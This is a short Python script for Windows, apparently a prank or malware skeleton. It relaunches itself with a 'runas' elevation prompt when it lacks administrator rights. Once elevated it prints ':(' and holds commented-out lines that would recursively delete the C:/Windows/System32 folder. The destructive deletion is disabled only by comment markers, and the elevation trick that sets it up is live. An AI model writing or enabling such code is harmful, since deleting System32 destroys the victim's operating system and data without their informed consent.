#import shutil
#from pathlib import Path
import ctypes
import os
import sys

if ctypes.windll.shell32.IsUserAnAdmin():
    print(':(')
    #system32 = Path("C:/Windows/System32")
    #shutil.rmtree(system32)
else:
    #print(path)
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
